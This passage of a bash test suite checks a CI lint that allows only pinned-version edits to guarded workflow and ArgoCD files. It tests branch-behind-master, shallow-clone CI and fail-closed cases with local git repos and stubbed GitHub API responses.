rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""
ref_ actions/checkout v4 commit $NEW
ref_ docker/setup-buildx-action v3 commit $NEW
out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
if [ $rc = 0 ] && grep -q '^pin-only-lint: OK' <<< "$out"; then
  pass=$((pass+1)); echo "PASS initial-pin-unpinned-to-pinned (rc 0)"
else
  fail=$((fail+1)); echo "FAIL initial-pin-unpinned-to-pinned — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
fi
git -C "$R2" checkout -q master

# Initial pin with a mismatched owner/repo (removed actions/checkout, added actions/cache) → FAIL.
git -C "$R2" checkout -q -b "initial-pin-mismatch" "$BASE2"
sed -i "s|uses: actions/checkout@v4|uses: actions/cache@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
git -C "$R2" add -A && git -C "$R2" commit -q -m "pin mismatch"
rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""
ref_ actions/cache v4 commit $NEW
out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
if [ $rc != 0 ] && grep -q 'do not pair up' <<< "$out"; then
  pass=$((pass+1)); echo "PASS initial-pin-owner-mismatch (rc $rc, fired on 'do not pair up')"
else
  fail=$((fail+1)); echo "FAIL initial-pin-owner-mismatch — wanted 'do not pair up', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
fi
git -C "$R2" checkout -q master

# ── three-dot (homelab#1713 / #1736): master moves a GUARDED file after the branch forks. The
# lint judges the branch's OWN diff (merge base → head), so master's change is never the PR's.
# Master's commit is a NON-pin edit of openrouter-operator.yaml (chart: x → y — it reached master by
# the operator path); each branch forks at BASE, BEFORE it. Two arms, both from the script's header:
#   local  — HEAD is the branch, base = master's tip (a branch merely BEHIND master, #1713);
#   CI     — HEAD is a synthetic refs/pull/N/merge (master tip + branch), base = the event-time
#            base.sha, PR_HEAD_SHA = the branch tip, and the stubbed compare names the fork point as
#            merge base (#1736: master advanced between the PR event and the checkout);
#   shallow — the real CI shape: a depth-1 clone of that merge ref, base fetched at depth 1, the PR
#            head read from an Actions event payload ($GITHUB_EVENT_PATH — no env wiring), and the
#            merge base + head fetched by the lint itself from origin (a file:// remote here).
# A branch that writes a non-pin line itself stays red in both arms, naming ITS file only.
rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""
git -C "$R" checkout -q master && git -C "$R" reset -q --hard "$BASE"
sed -i 's|chart: x|chart: y|' "$R/argocd/platform/openrouter-operator.yaml"
git -C "$R" commit -q -am "master: operator edit of a guarded file"
MASTER_TIP="$(git -C "$R" rev-parse HEAD)"
mkdir -p "$STUB/repos/$PIN_ONLY_SLUG/compare"
git -C "$R" config uploadpack.allowAnySHA1InWant true  # the shallow arm fetches by SHA, as from GitHub
printf '{"merge_base_commit":{"sha":"%s"}}\n' "$BASE" >"$STUB/repos/$PIN_ONLY_SLUG/compare/master...pin-head"
# three_dot_ <name> <want: ok | stderr keyword> <must-not-name> <edit shell on the branch>
three_dot_() {
  local name="$1" want="$2" absent="$3" edit="$4" head arm out rc ok
  git -C "$R" checkout -q -b "td-$name" "$BASE"
  ( cd "$R" && eval "$edit" ) >/dev/null 2>&1
  git -C "$R" add -A && git -C "$R" commit -q -m "$name"; head="$(git -C "$R" rev-parse HEAD)"
  # the stub is keyed by path; re-key the compare file to this branch's head sha
  cp "$STUB/repos/$PIN_ONLY_SLUG/compare/master...pin-head" "$STUB/repos/$PIN_ONLY_SLUG/compare/master...$head"
  for arm in local ci shallow; do
    if [ "$arm" = local ]; then
      out="$(bash "$LINT" "$MASTER_TIP" 2>&1)"; rc=$?
    elif [ "$arm" = ci ]; then
      git -C "$R" checkout -q --detach "$MASTER_TIP" && git -C "$R" merge -q --no-ff --no-edit "$head" >/dev/null
      out="$(PR_HEAD_SHA="$head" BASE_REF=master GITHUB_REPOSITORY="$PIN_ONLY_SLUG" bash "$LINT" "$BASE" 2>&1)"; rc=$?
    else
      git -C "$R" branch -f "pull-merge-$name" HEAD  # the ci arm's merge commit, as refs/pull/N/merge
      rm -rf "$T/shallow"; git clone -q --depth 1 --branch "pull-merge-$name" "file://$R" "$T/shallow"
      git -C "$T/shallow" fetch -q --no-tags --depth=1 origin "$BASE"
      printf '{"pull_request":{"head":{"sha":"%s"},"base":{"ref":"master"}}}\n' "$head" >"$T/event.json"
      out="$(PIN_ONLY_REPO="$T/shallow" GITHUB_EVENT_PATH="$T/event.json" GITHUB_REPOSITORY="$PIN_ONLY_SLUG" bash "$LINT" "$BASE" 2>&1)"; rc=$?
    fi
    if [ "$want" = ok ]; then
      [ $rc = 0 ] && grep -q '^pin-only-lint: OK' <<< "$out" && ok=1 || ok=0
    else
      [ $rc != 0 ] && grep -qF -- "$want" <<< "$out" && ok=1 || ok=0
    fi
    [ -n "$absent" ] && grep -qF -- "$absent" <<< "$out" && ok=0
    if [ "$ok" = 1 ]; then pass=$((pass+1)); echo "PASS three-dot-$name [$arm] (rc $rc)"
    else fail=$((fail+1)); echo "FAIL three-dot-$name [$arm] — wanted ${want}${absent:+, never naming $absent}, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'; fi
  done
  git -C "$R" checkout -q master
}
# The renovate shape of #1713's acceptance: an arc-runner pin bump forked before master's edit → OK.
three_dot_ behind-pin-bump ok openrouter-operator \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml"
# A docs-only branch behind the same master edit → the no-op verdict, not master's file.
three_dot_ behind-docs-only ok openrouter-operator "echo x > README.md"
# The branch writes a non-pin line into a guarded file itself → still red, on arc-runners only.
three_dot_ behind-smuggled 'may only receive PIN lines' openrouter-operator \
  "echo '      privileged: true' >> argocd/platform/arc-runners.yaml"
# Fail closed: the CI arm with no readable compare (no stub file → the 404 shape) is a FAIL, rc 2.
out="$(PR_HEAD_SHA="$MASTER_TIP" BASE_REF=master GITHUB_REPOSITORY="$PIN_ONLY_SLUG" bash "$LINT" "$BASE" 2>&1)"; rc=$?
if [ $rc = 2 ] && grep -q 'could not read the merge base' <<< "$out"; then
  pass=$((pass+1)); echo "PASS three-dot-compare-unreadable (rc 2)"
else
  fail=$((fail+1)); echo "FAIL three-dot-compare-unreadable — wanted rc 2 'could not read the merge base', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
fi

echo "pin-only-lint-test: $pass passed, $fail failed"
[ "$fail" = 0 ]
